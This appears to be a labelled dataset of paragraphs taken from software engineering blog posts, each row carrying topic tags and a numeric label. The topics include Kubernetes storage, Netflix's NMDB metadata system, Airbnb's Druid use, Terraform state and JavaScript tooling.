1194,"Moving to containers, however, presents new challenges for storage provisioning. In particular, using traditional storage solutions for distributed containerized workloads turns out to be too complex and costly. Key issues associated with the traditional storage solutions include the following: The number of block volumes that can be attached to a server is limited in most operating systems. For example, AWS Linux-based instances set a limit to 40 block volumes. Attaching more can provoke boot failures and is only supported on a best effort basis (i.e., it is not guaranteed). However, the container technology allows running hundreds of containerized applications on a single host in compact containers. These containers may require more volumes than can be provided by the OS. Therefore, container users need a more flexible approach that supports storage virtualization and pooling.","['Docker', 'Software Defined Storage', 'Network Storage', 'Storage Solutions', 'Container Orchestration']",10
1195,"Scale IO interacts with the local storage by installing its software tools on each application hosts. In their turn, these hosts market their DAS to the Scale IO cluster. After the storage capacity is contributed to the cluster, hosts can use software-defined volumes via the Scale IO API. The storage consumption is managed by the Scale IO Data Client (SDC), a compact device driver located on each host that needs access to the Scale IO cluster. The SDCs have a small in-memory map that can map petabytes of data with just several megabytes of RAM. Besides storage pooling, Scale IO supports data recovery, data protection, replication, backups, and thin provisioning.","['Docker', 'Software Defined Storage', 'Network Storage', 'Storage Solutions', 'Container Orchestration']",8
1196,"One of the best features of Portworx in Kubernetes is hyperconvergence. The thing is that state stateful apps like Elasticsearch and Cassandra perform best when run in close proximity with their data. However, Kubernetes volume plugin system does not support primitives that can be used to optimize location of Pods. You can use labels and node affinity to get around these issues, but this introduces overhead when scaling to large clusters. Stork overcomes this limitation by implementing a Kubernetes scheduler extender. This feature can be used to influence Pod scheduling based on the location of volumes that a Pod requires.","['Docker', 'Software Defined Storage', 'Network Storage', 'Storage Solutions', 'Container Orchestration']",11
1197,"In Kubernetes, Portworx volumes can be mounted using the portworx Volume plugin. A portworx Volume can be dynamically created using a Storage Class or it can be pre-provisioned and referenced inside a Kubernetes Pod. Here is an example Pod using the portworx Volume: In this article, we have discussed the architecture of Software-Defined Storage and reviewed key SDS solutions for Kubernetes. SDS is a very efficient solution for distributed compute environments dependent on diverse storage types and filesystems. Its also a good option for containerized applications that require dynamic storage provisioning, instant storage scaling, and HA across different availability zones and server types. In the next blog, well discuss how to use these and other features of SDS in Kubernetes using Portworx as an example. Stay tuned to our Medium blog to learn more!","['Docker', 'Software Defined Storage', 'Network Storage', 'Storage Solutions', 'Container Orchestration']",11
1198,"The growth of No SQL databases has broadly been accompanied with the trend of data schemalessness (e.g., key value stores generally allow storing any data under a key). A schemaless system appears less imposing for application developers that are producing the data, as it (a) spares them from the burden of planning and future-proofing the structure of their data and, (b) enables them to evolve data formats with ease and to their liking. However, schemas are implicit in a schemaless system as the code that reads the data needs to account for the structure and the variations in the data (schema-on-read). This places a burden on applications that wish to consume that supposed treasure trove of data and can lead to strong coupling between the system that writes the data and the applications that consume it. For this reason, we have implemented NMDB as a schema-on-write systemdata is validated against schema at the time of writing to NMDB. This provides several benefits including (a) schema is akin to an API contract, and multiple applications can benefit from a well defined contract, (b) data has a uniform appearance and is amenable to defining queries, as well as Extract, Transform and Load (ETL) jobs, (c) facilitates better data interoperability across myriad applications and, (d) optimizes storage, indexing and query performance thereby improving Quality of Service (Qo S). Furthermore, this facilitates high data read throughputs as we do away with complex application logic at the time of reading data.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1199,"In NMDB we think of the media metadata universe in units of Data Stores. A specific media analysis that has been performed on various media assets (e.g., loudness analysis for all audio files) would be typically stored within the same Data Store (DS). while different types of media analyses (e.g., video shot boundary and video face detection) for the same media asset typically would be persisted in different Data Stores. A DS helps us achieve two very important purposes (a) serves as a logical namespace for the same media analysis for various media assets in the Netflix catalog, and (b) serves as a unit of access controlan application (or equivalently a team) that defines a Data Store also configures access permissions to the data. Additionally, as was described in the previous blog article, every DS is associated with a schema for the data it stores. As such, a DS is characterized by the three-tuple (1) a namespace, (2) a media analysis type (e.g., video shot boundary data), and (3) a version of the media analysis type (different versions of a media analysis correspond to different data schemas). This is depicted in Figure 1.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1200,"In the Netflix microservices environment, different business applications serve as the system of record for different media assets. For example, while playable media assets such as video, audio and subtitles for a title could be managed by a playback service, promotional assets such as images or video trailers could be managed by a promotions service. NMDB introduces the concept of a Media ID (MID) to facilitate integration with these disparate asset management systems. We think of MID as a foreign key that points to a Media Document instance in NMDB. Multiple applications can bring their domain specific identifiers/keys to address a Media Document instance in NMDB. We implement MID as a map from strings to strings. Just like the media data schema, an NMDB DS is also associated with a single MID schema. However unlike the media data schema, MID schema is immutable. At the time of the DS definition, a client application could define a set of (name, value) pairs against which all of the Media Document instances would be stored in that DS. A MID handle could be used to fetch documents within a DS in NMDB, offering convenient access to the most recent or all documents for a particular media asset.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1201,"We have chosen the high data capacity and high performance Cassandra (C*) database as the backend implementation that serves as the source of truth for all our data. A front-end service, known as Media Data Persistence Service (MDPS), manages the C* backend and serves data at blazing speeds (latency in the order of a few tens of milliseconds) to power these business critical applications. MDPS uses local quorum for reads and writes to guarantee read-after-write consistency. Data immutability helps us sidestep any conflict issues that might arise from concurrent updates to C* while allowing us to perform IO operations at a very fast clip. We use a UUID as the primary key for C*, thus giving every write operation (a MID + a Media Document instance) a unique key and thereby avoiding write conflicts when multiple documents are persisted against the same MID. This UUID (also called as Document ID) also serves as the primary key for the Media Document instance in the context of the overall NMDB system. We will touch upon immutability again in later sections to show how we also benefited from it in some other design aspects of NMDB.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1202,"In principle, a graph database can answer arbitrary queries and promises optimal query performance for joins. For that reason, we explored a graph-like data-model so as to address our query use cases. However, we quickly learnt that our primary use case, which is spatio-temporal queries on the media timeline, made limited use of database joins. And in those queries, where joins were used, the degree of connectedness was small. In other words the power of graph-like model was underutilized. We concluded that for the limited join query use-cases, application side joins might provide satisfactory performance and could be handled by an application we called Media Data Query Service (MDQS). Further, another pattern of queries emergedsearching unstructured textual data e.g., mining movie scripts data and subtitle search. It became clear to us that a document database with search capabilities would address most of our requirements such as allowing a plurality of metadata, fast paced algorithm development, serving unstructured queries and also structured queries even when the query patterns are not known a priori.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1203,"Elasticsearch (ES), a highly performant scalable document database implementation fitted our needs really well. ES supports a wide range of possibilities for queries and in particular shines at unstructured textual search e.g., searching for a culturally sensitive word in a subtitle asset that needs searching based on a stem of the word. At its core ES uses Lucenea powerful and feature rich indexing and searching engine. A front-end service, known as Media Data Analysis Service (MDAS), manages the NMDB ES backend for write and query operations. MDAS implements several optimizations for answering queries and indexing data to meet the demands of storing documents that have varying characteristics and sizes. This is described more in-depth later in this article.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1204,"As indicated above, business requirements mandated that NMDB be implemented as a system with multiple microservices that manage a polyglot of Data Bases (DBs). The different constituent DBs serve complementary purposes. We are however presented with the challenge of keeping the data consistent across them in the face of the classic distributed systems shortcomingssometimes the dependency services can fail, sometimes service nodes can go down or even more nodes added to meet a bursty demand. This motivates the need for a robust orchestration service that can (a) maintain and execute a state machine, (b) retry operations in the event of transient failures, and (c) support asynchronous (possibly long running) operations such as queries. We use the Conductor orchestration framework to coordinate and execute workflows related to the NMDB Create, Read, Update, Delete (CRUD) operations and for other asynchronous operations such as querying. Conductor helps us achieve a high degree of service availability and data consistency across different storage backends. However, given the collection of systems and services that work in unison it is not possible to provide strong guarantees on data consistency and yet remain highly available for certain use cases, implying data read skews are not entirely avoidable. This is true in particular for query APIsthese rely on successful indexing of Media Document instances which is done as an asynchronous, background operation in ES. Hence queries on NMDB are expected to be eventually consistent.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",10
1205,"Included in Figure 2 is a component named Object Store that is a part of the NMDB data infrastructure. Object Store is a highly available, web-scale, secure storage service such as Amazons Simple Storage Service (S3). This component ensures that all data being persisted is chunked and encrypted for optimal performance. It is used in both write and read paths. This component serves as the primary means for exchanging Media Document instances between the various components of NMDB. Media Document instances can be large in size (several hundreds of MBsperhaps because a media analysis could model metadata e.g., about every frame in a video file. Further, the per frame data could explode in size due to some modeling of spatial attributes such as bounding boxes). Such a mechanism optimizes bandwidth and latency performance by ensuring that Media Document instances do not have to travel over the wire between the different microservices involved in the read or the write path and can be downloaded only where necessary.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1206,"The animation shown in Figure 3 details the machinery that is set in action when we write into NMDB. The write process begins with a client application that communicates its intent to write a Media Document instance. NMDB accepts the write request by submitting the job to the orchestration framework (Conductor) and returns a unique handle to identify the request. This could be used by the client to query on the status of the request. Following this, the schema validation, document persistence and document indexing steps are performed in that order. Once the document is persisted in C* it becomes available for read with strong consistency guarantees and is ready to be used by read-only applications. Indexing a document into ES can be a high latency operation since it is a relatively more intensive procedure that requires multiple processes coordinating to analyze the document contents, and update several data structures that enable efficient search and queries.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",3
1207,"Scaling Strategies From the perspective of writing to NMDB, some of the NMDB components are compute heavy while some others are IO heavy. For example, the bottle neck for MDVS is CPU as well as memory (as it needs to work with large documents for validation). On the other hand MDAS is bound by network IO as well (Media Document instances need to be downloaded from NMDB Object Store to MDAS so that they can be indexed). Different metrics can be used to configure a continuous deployment platform, such as Spinnaker for load balancing and auto-scaling for NMDB. For example, requests-per-second (RPS) is commonly used to auto-scale micro services to serve increased reads or queries. While RPS or CPU usage could be useful metrics for scaling synchronous services, asynchronous APIs (like storing a document in NMDB) bring in the requirement of monitoring queue depth to anticipate work build up and scale accordingly.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1208,"The strategy discussed above gives us a good way to auto-scale the NMDB micro services layer (identified as Service Plane in Figure 4) quasi-linearly. However as seen in Figure 4, the steady state RPS that the system can support eventually plateaus at which point scaling the Service Plane does not help improve SLA. At this point it should be amply clear that the data nodes (identified as Data Backend) have reached their peak performance limits and need to be scaled. However, distributed DBs do not scale as quickly as services and horizontal or vertical scaling may take a few hours to days, depending on data footprint size. Moreover, while scaling the Service Plane can be an automated process, adding more data nodes (C* or ES) to scale the Data Backend is typically done manually. However, note that once the Data Backend is scaled up (horizontal and/or vertically), the effects of scaling the Service Plane manifests as an increased steady state RPS as seen in Figure 4.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",11
1209,"To address these opposing limitations, we came up with the idea of using data denormalization. Adopting this needs more thought since data denormalization can potentially lead to data explosion. Through a process referred to as chunking, we split up large document payloads into multiple smaller documents prior to indexing them in ES. The smaller chunked documents could be indexed by using multiple threads of computation (on a single service node) or multiple service nodesthis results in better workload distribution, efficient memory usage, avoids hot spots and improves indexing latencies (because we are processing smaller chunks of data concurrently). We utilized this approach simultaneously with some careful decisions around what data we denormalize in order to provide optimal indexing and querying performance. More details of our implementation are presented as follows.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1210,"As noted earlier, NMDB has a treasure trove of indexed media metadata and lots of interesting insight could be developed by analyzing it. The MDAS backend with ES forms the backbone of analytical capabilities of NMDB. In a typical analytics usage, NMDB users are interested in two types of queries: A DS level query to retrieve all documents that match the specified query. This is similar to filtering of records using SQL WHERE clause. Filtering can be done on any of the entities in a Media Document instance using various condition operators =, > or < etc. Conditions can also be grouped using logic operators like OR, AND or NOT etc.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1211,"The two query types target different use cases. Queries of the first type span an entire NMDB DS and can provide insights into which documents in a DS match the specified query. Considering the huge payload of data corresponding to Media Document instances that match a query of the first type, NMDB only returns the coordinates (Document ID and MID) of the matching documents. The second query type can be used to target a specific Media Document instance using Document ID and retrieve portions of the document with conditional filtering applied. For example, only a set of events that satisfy a specified query could be retrieved, along with Track and Component level metadata. While it is typical to use the two types of queries in succession, in the event where a document handle is already known one could glean more insights into the data by directly executing the second query type on a specific Media Document instance.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1212,"As explained in the previous blog post, the Media Document model has a hierarchical structure and offers a logical way of modeling media timeline data. However, such a hierarchical structure is not optimal for parallel processing. In particular validation (MDVS) and indexing (MDAS) services could benefit immensely by processing a large Media Document instance in parallel thereby reducing write latencies. A compositional structure for Media Document instances would be more amenable to parallel processing and therefore go a long way in alleviating the challenges posed by large Media Document instances. Briefly, such a structure implies a single media timeline is composed of multiple smaller media timelines, where each media timeline is represented by a corresponding smaller Media Document instance. Such a model would also enable targeted reads that do not require reading the entire Media Document instance.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1213,"On the query side, we anticipate a growing need for performing joins across different NMDB Data Store instancesthis could be computationally intensive in some scenarios. This along with the high storage costs associated with ES is motivating us to look for other big-data storage solutions. As NMDB continues to be the media metadata platform of choice for applications across Netflix, we will continue to carefully consider new use cases that might need to be supported and evaluate technologies that we will need to onboard to address them. Some interesting areas of future work could involve exploring Map-Reduce frameworks such as Apache Hadoop, for distributed compute, query processing, relational databases for their transactional support, and other Big Data technologies. Opportunities abound in the area of media-oriented data systems at Netflix especially with the anticipated growth in business applications and associated data. by Shinjan Tiwary, Sreeram Chakrovorthy, Subbu Venkatrav, Arsen Kostenko, Yi Guo and Rohit Puri.","['Nmdb', 'Apache Cassandra', 'Elasticsearch', 'Media Timeline', 'Media Document Model']",8
1214,"In the past, request context was available in the monolithic Airbnb Rails application but were not propagated to downstream services. For example, not having the user id made it difficult to do guests-side experiments or incremental feature rollouts that required the coordination of several services. In the SOA world, the request context should be propagated along with a request. The request context also enables standard service platform security policy checks and rate-limiting. For service reliability and resilience, the request context is used to propagate a distributed service RPC time budget (for response deadlines and retries).","['API', 'Airbnb', 'Soa', 'Software Engineering', 'Service Design']",10
1215,"At Airbnb, a service owner must complete a production-readiness checklist before his service is launched into production. A critical item in that list is metrics. In the past, service owners emitted different metrics with uneven coverage and created metrics dashboards that varied greatly in completeness, correctness, up-to-date-ness, and interpretation. The old metric naming convention was to prefix all metrics of a service by the service name. For example, the Banana service would have a __url__ metric. It led to services having different metric names for response latencies and error counts, which further led to each service having its own service dashboard. An additional issue was difficulty in finding the right dashboard and the right graph, especially during an incident when sysops engineers really need it as quickly as possible for fire-fighting.","['API', 'Airbnb', 'Soa', 'Software Engineering', 'Service Design']",8
1216,"Standard health and performance monitoring is not only key to maintain, debug, and improve our services, they are critical in every service deployment to ensure no regressions happen. Generating alerts on the standard service metrics allows service owners and sysops be paged as early as possible. The standard service platform encourages and enforces infrastructure standards and best practices to all services without incurring additional development overhead. It makes standard specifications like request context, response context, mutual TLS easily available to service developers. The service IDL-centered service platform enables engineers to focus on writing service business logic rather than plumbing and monitoring work. A conservative estimate of time saved over the previous service development process using the service platform with the standardization features described here is 23 weeks.","['API', 'Airbnb', 'Soa', 'Software Engineering', 'Service Design']",10
1217,"We are implementing interaction tests, so everything is sequential. Next, well wait for an event/item to display on the screen. When the one we expected is displayed, well click it, and then well wait again for the next one to appear on the screen. You get the idea: start the test, wait, click, wait. Sometimes, we may need to use a sleep condition just to make sure that a specific event happens or a specific item appears on the screen; otherwise, we may not notice it.","['Product', 'Mobile Test Automation', 'Python', 'AWS', 'Outsystems']",6
1218,"How do I know that something is on the screen? Okay, this is the tricky part. Remember the article that I wrote about building native apps with Out Systems MABS a while back? If yes, you already know that Out Systems applications are hybrid. This means that some changes we make when creating our Out Systems applications are mapped to HTML. So if you always set a data attribute with a label, it helps you identify your application elements in the test case, and its easier to find the element with XPATH.","['Product', 'Mobile Test Automation', 'Python', 'AWS', 'Outsystems']",19
1219,"Weve created our test, and now were ready to submit it to the Amazon Device Farm. Its straightforward: running a command we can create a zip file containing our test bundle. This test bundle is important because it contains the test and libraries that will be executed by the AWS Device Farm. In the AWS Console, create the project where you will perform your tests and a new run. A run represents a specific app with a specific set of tests on a specific set of devices. After this, you should upload your app package and your tests. If you dont have any, AWS has you covered with two built-in tests. In this example, well be using our own.3. Now the fun begins: select the devices that you want to test and specify the device state (Wi Fi, NFC, GPS, Bluetooth). Currently, AWS Device Farm has 178 Android and 162 i OS devices. For Android, there are 139 distinct devices (Motorola, Samsung, Wiko, and so on) operating with 23 different Android versions. For i OS, there are 26 distinct devices (i Pad 2, i Phone 8, i Pod Touch 6th Gen, and so on) operating with 26 different i OS versions.4. Review, run, and view the results! Each run produces a report with the device logs, test logs, screenshots, videos, and more.","['Product', 'Mobile Test Automation', 'Python', 'AWS', 'Outsystems']",7
1220,"The primary way high-level analytics is exposed and shared within the company is through various dashboards. A lot of people use these dashboards every day to make various decisions. Dashboards also allow real-time tracking and monitoring of various aspects of our business and systems. As a result, the timeliness of these dashboards is critical to the daily operation of Airbnb. However, we are faced with three challenges: First, it would take a long time to aggregate data in the warehouse and generate the necessary data for these dashboards using systems like Hive and Presto at query time. Hive/Presto have to read all the data and aggregate them on demand, resulting in all necessary computation getting invoked at query time. Even if those engines are used to pre-compute the aggregation and store them, the storage format is not optimized for repeated slicing and dicing of data that analytics queries demand.","['Big Data', 'Druid', 'Airbnb', 'Data Science', 'Data Engineering']",6
1221,"Druid has a mature query mechanism with JSON over HTTP RESTful API, in addition to SQL query support with recent versions. However, one of the limitations of Druid is that it does not yet allow cross data source queries (simplistically speaking, a join query). All the aggregate queries are limited to a single data-source. In Airbnb however, we do have scenarios where multiple data-sources with overlapping dimensions need to joined together for certain queries. The alternative is to keep all the data in one single data-source, which is not optimal in our scenario for various reasons including cadence of data generation, source of data being different (e.g. different services produce the data) and so on. However, the need for cross data source query is real and has recently become a hard requirement.","['Big Data', 'Druid', 'Airbnb', 'Data Science', 'Data Engineering']",8
1222,"To solve this, we have designed a solution that basically keeps all the newly ingested segments inactive until explicit activation. This enables the ingestion framework to split the source of data into smaller intervals with acceptable sizes. The framework then ingests these intervals in parallel (as parallel as Yarn cluster resources allow). Since the newly ingested data is still inactive, the segments are hidden in the background and theres no mix of different versions of data when computing results for queries being executed while backfill ingestion is still in progress. When we activate the latest version of segments for the data source, it will be refreshed with the new version without downtime. Split and refresh greatly improved backfill performance and has made backfills that used to run longer than a day finish in one hour now.","['Big Data', 'Druid', 'Airbnb', 'Data Science', 'Data Engineering']",8
1223,"Druid has been running at Airbnb for years and it is one of the systems with the lowest maintenance cost. Druids multi-role design makes operations easy and reliable. Cluster administrators can adjust cluster configuration and add/remove nodes based on the monitoring metrics. As data grows in our Druid cluster, we can continue adding historical node capacity to cache and serve the larger amount of data easily. If the real-time ingestion workload shows an uptick, we can easily add middle manager nodes accordingly. Similarly, if more capacity is needed to handle queries, we can increase the broker node count. Thanks to Druids decoupled architecture, we were able to perform a large operation that migrated all data in deep storage from HDFS to S3 with a newly rebuilt cluster, with only minutes downtime.","['Big Data', 'Druid', 'Airbnb', 'Data Science', 'Data Engineering']",10
1224,"One of the issues we deal with is the growth in the number of segment files that are produced every day that need to be loaded into the cluster. Segment files are the basic storage unit of Druid data, that contain the pre-aggregated data ready for serving. At Airbnb, we are encountering a few scenarios where a large number of our data sources sometime need to be recomputed entirely, resulting in a large number of segment files that need to be loaded at once onto the cluster. Currently, ingested segments are loaded by coordinators sequentially in a single thread, centrally. As more and more segments are produced, the coordinator is unable to keep up and we see increasing delay between the time an ingestion job completes and the time the data becomes available for querying (after being loaded by the coordinator). Sometimes the delay can be hours long.","['Big Data', 'Druid', 'Airbnb', 'Data Science', 'Data Engineering']",8
1225,"Mac Paint and Quick Draw Source Code, July 18, 2010APL Programming Language Source Code, October 10, 2012Adobe Photoshop Source Code, February 13, 2013Apple II DOS Source Code, November 12, 2013Microsoft MS-DOS Early Source Code, March 25, 2014Microsoft Word for Windows Version 1.1a Source Code, March 25, 2014Early Digital Research CP/M Source Code, October 1, 2014Xerox Alto Source Code, October 21, 2014Electronic Arts Deluxe Paint Early Source Code, July 22, 2015Len Shustek is chairman of the Board of Trustees of the Computer History Museum. In 1979, he cofounded Nestar Systems, an early developer of networks for personal computers. In 1986, he co-founded Network General, a manufacturer of network analysis tools including The Sniffer. The company became Network Associates after merging with Mc Afee Associates and PGP. He has taught computer science at Carnegie-Mellon and Stanford Universities, and was a founder of the angel financing firm Ven Craft. He has served on various boards, including the Polytechnic Institute of New York University.","['Tech', 'Email', 'Qualcomm', 'Computer History Museum', 'Software']",16
1226,"In software as in life, one thing that winds up being true about architecture is that its what you live in. Think about the code you interact with on a daily basis. Is it easy to take pieces out and put pieces in? Does reading it yield a pleasant sense of order and clarity, or a discomfiting sense of chaos and muddiness? This is a little loose, as criteria go, but it works. Its also easy to get a grip on: when talking to people who have some experience with the warp and weft of a codebase, theyll know its tactile qualities more readily than theyll know whether its well-architected in the abstract.","['Software Development', 'Engineering', 'Feature', 'Code']",9
1227,"This is doubly true because design begets design: the style of your code affects the style of all the code that invokes it, imports it, or otherwise involves it. Did you choose a very object-oriented approach? Code that depends on yours will have to interact with your objects. Depending code should be ready to compose your functions with its own. Even subtler details, like the shape of your methods parameters and the type of their return values, will nudge calling codes own design in one direction or another.","['Software Development', 'Engineering', 'Feature', 'Code']",9
1228,"The simple act of paying attention is the royal road to becoming a better architect. Observe the decisions youre already making. Try to understand why you think a function should take this parameter rather than that, or return that type rather than the other. Then test that understanding against your colleagues and your stakeholders. Design is revision, so you should be prepared to be wrongwrong is often the best thing one can be, when it comes to learningbut also to reason about and defend the choices you make.","['Software Development', 'Engineering', 'Feature', 'Code']",9
1229,"More users are using their smart-ish phones to access your site. Their experience is less than ideal because your site is not optimized for mobile but your content is so good, that they put up with your broken UX. But youre no amateur and care deeply about your users. You bring together your best front-end developers and, within a few months, they help turn your site responsive. It works like a charm on mobile browsers. Youve navigated the tumultuous highway of technology and mobile traffic skyrockets.","['Web Development', 'Headless Cms', 'Content Management System', 'CMS', 'Engineering']",17
1230,"Pretty neat:-)But now that youve got this basic setup going, youre probably wondering: But what happens when I dont want to work with Vendor A but want to continue working with all my other vendors/partners? Can I selectively turn off their access to my content? You can simply change or delete their access key. No more content for them (lol cheeky! )All this seems too good to be true, what am I missing here? While a headless CMS can often be liberating at first, things can get out of hand if youre not careful. Here are a few things you should consider before selecting a headless CMS: Because this headless CMS is a cloud-hosted platform, youre likely to be paying a monthly subscription fee (as opposed to a one-time licensing cost). Depending on which CMS platform you choose, your monthly burn can be anywhere from a few hundred to about a thousand dollars a month. Depending on the scale of your operation, pick a headless CMS that fits your needs as well as your budget.","['Web Development', 'Headless Cms', 'Content Management System', 'CMS', 'Engineering']",19
1231,"We could try to use something like git cherry-pick but we rather not starting to mess with git branches. Besides, the underlying problem is that test-team should be able to test these features independent of each other. A more ideal solution would be to have separate deployment environments for feature-testing. And so the following idea emerged: For provisioning environments for deploying PRs, different options exists. Whatever option is chosen, it is important to follow the concept of cattle, not pets, resulting in that these environments should be easy to set up, and also easy to break down or replace. We chose to use Kubernetes for this situation (although Terra Form would also be a good fit).","['Docker', 'Kubernetes', 'DevOps', 'AWS', 'Aws Eks']",18
1232,"Release Pipelines are used as a next phase. It uses the output produced by our Build Pipelines as input. Of course, the output of our docker build-pipelines are on ECR, not on Azure Dev Ops. The kubernetes yaml files are the only input used by the Release phase. The kubernetes cluster itself will pull the images straight from ECR when needed. (This sounds easier than done: EKS, AWSs managed kubernetes solution, uses its own authorization mechanism, which does not play nicely with kubernetes own auth-mechanism. The solution consists of deploying a cronjob which will pull for new secrets once in a while, that will allow your cluster to be able to successfully authorize with ECR. This blogpost describes the solution in more detail).","['Docker', 'Kubernetes', 'DevOps', 'AWS', 'Aws Eks']",7
1233,"Promotion process In short, its all about just obtaining a specific manifest (by version) and use it to run Terraform apply against a target environment. :)Oh yeah, one more thing, adding deployment information as a part of that process can be very useful and could result in having that: Last word I must admit, for some reason Im a fan of a distributed CI pipeline approach that assumes that you treat each branch exactly the same and that each branch can go all the way through the whole process. No special branches, you can easily create how many environments you want, everything as flexible as possibletest, build deploy with a single click, devs happy:)Why I didnt want to have separate build pipelines for each microservice for example? Because I thought that would be more hassle even though I could avoid most of that logic applied in the PREP stage. That complexity would possibly just move somewhere else or turn into something else. Linking jobs, passing data between them make me think of potential synchronisation issues, jobs run more often that required, multiple manifests per service, etc.","['Lambda', 'Jenkins', 'Declarative Pipeline', 'API', 'Terraform']",18
1234,"Heres the scenario, youve documented the steps for creating new infrastructure using Terraform including ensuring that state files are dealt with properly (remote in AWS S3). However, at some point those directions arent followed and you now have infrastructure that is orphaned with no state. The only answer is to get familiar with the import command of Terraform At a high level Terraform state is a mapping of the actual state of your infrastructure which was created from your configurations (which are the desired state). The state file is a custom JSON hierarchy which contains the following metadata:version - the protocol version of the state fileterraform_version - the version of Terraform that wrote this state fileserial - incremented on any operation that modifies the infrastructureversionthe protocol version of the state fileterraform_versionthe version of Terraform that wrote this state fileserialincremented on any operation that modifies the infrastructurelineageset when the state is createdremoteused to track the metadata required to push/pull state the configured remotebackendused to track the configuration for the backend in use with the statemodulescontains all the modules in a breadth-first orderpaththe import path from the root moduleoutputsany outputs declared by the moduleresourcesa mapping of the logically name resources within that leveldepends_ona list of things this module relies on Another thing to consider with regards to state and Terraform in general is that it operates using the breadth-first order (BFS) algorithm. This means that it will traverse the graph data structure level-by-level. Specifically it will start with the configurations in the current working directory which it considers the root module and then pull in the next level of modules and so on.","['AWS', 'DevOps', 'Terraform', 'Infrastructure As Code']",7
1235,"Why the hack this package changed the API again? Why that library stopped working with this version of Webpack? What version of X do I need to be compatible with Y? Why am I suddenly getting all these warnings in the console? What do I need to do for this tool to work with symlinks? Why this feature is not documented anywhere? Why that package suddenly disappeared from NPM registry? Why, why, why The famous nineties were the years when all the core languages of web platform were created.1990: HTML was developed by Tim Berners-Lee in CERN. This language was simple to use and became universal language for emerging web platform.1994: CSS was proposed as styling language by Hkon Wium Lie, again in CERN. Because having just plain HTML documents is ugly.1995: Java Script was created by Brendan Eich. Because having just a static web pages is boring.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",18
1236,"Then the millennium passed and the world of web became a lot wilder.2006: j Query and similar libraries were developed on top of the Java Script. Because you can write less, do more.2010: Knockout, Backbone, Angular JS and other Java Script frameworks were created. Because j Query wasnt good enough.20112018: Ember, React, Angular, Vue and dozens of other Java Script framework and few quadrillions of NPM packages were developed. At lease one new NPM package was released during writing of this paragraph. Because simple websites evolved into complex web applications.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",19
1237,"It was already a topic two years ago, but I would say its even more general today: Somebody comes and says: Hey, there was a new cool framework released today. It does this and that and it has cool syntax, how could I live without it!? Its still alpha but quite stable most of the time, lets pack it our project straightaway! Well if you are masochist, just do it. But if you want to be productive or even if you have some colleagues to cooperate with, lets discuss all the news first. Not everyone could be so excited. And not everyone is willing to spend few days on adopting new library instead of being productive using well-known dev tools.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",19
1238,"I heard a lot about Vue. Maybe I could check some examples when I have some time. But for now I dont care. When the React wont be sufficient for me, I will consider switching to something else.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",19
1239,"If you have few years of developer experience, you probably noticed some repetitive patterns. If you didnt well, maybe its time to think about your life and your career:)Fetching data. The way how you display images. And so on Nowadays, everybody is talking about components. I say you should create reusable components. Or better reusable components with single responsibility. Or the best of the best: No matter how many times you pass the same parameters into component or whatever current state of your app is, you will always get the same result.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",9
1240,"Recently I started building my dream-library of reusable components. Standalone article about my components library will surly follow soon, so stay tuned. Now just few notes Every time Im creating a new component that is not in library yet, I will use abstraction to make it as general as possible and add it there. It doesnt need to be big thing. Important is, that its some pattern that repeats very often. Or at lease more then once.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",9
1241,Every developer is dealing with it all the time. You need to add 10 pixels above and 10 pixels below. Or 15 pixels above and 20 pixels below. Or 8 pixels to left and 3 pixels to the right. The core issue here is that you need to add some spacing.,"['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",14
1242,You need to toggle the menu. You want to expand or collapse some block of text. You would like to display tooltip when you hover over the link. Or switch between two states of some component. The Toggle component or whatever you call it. Create simple general functional component for this. Add it to your components library and use easily every time you need to turn something on or off.,"['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",15
1243,"The same Java Script code that runs in browser, can be used also in native mobile applications. The same app for Android, i OS and for web. Even for desktop if you want. For example Skype is written like that, so its definitely possible even for more complex apps.","['Web Development', 'JavaScript', 'Productivity', 'Programming', 'Beginner']",19
1244,"The Agile Model Another software development methodology is Agile Model. The difference between the Waterfall Model and the Agile Model lies in the amount of interaction during the development process. While there is no interaction during the development process using the Waterfall Model, the Agile Methodology is full of interaction during each phase of the process. While using the Agile Methodology, projects are broken down into smaller builds and every build goes through the interaction process. For example, a website project might get split into many phases with one of the phases being a function that allows users to ask for a quote, or the price of the services they require. This phase will go through the interactions of the methodology, which are planning, requirements analysis, design, coding, unit testing, and acceptance. These interactions will occur during every phase of the project. In the Agile Model, each phase of the project involves everyone, including clients, developers, designers, architects of the application, and managers.","['Agile', 'Outsourcing', 'Software Development', 'Software Engineering']",12
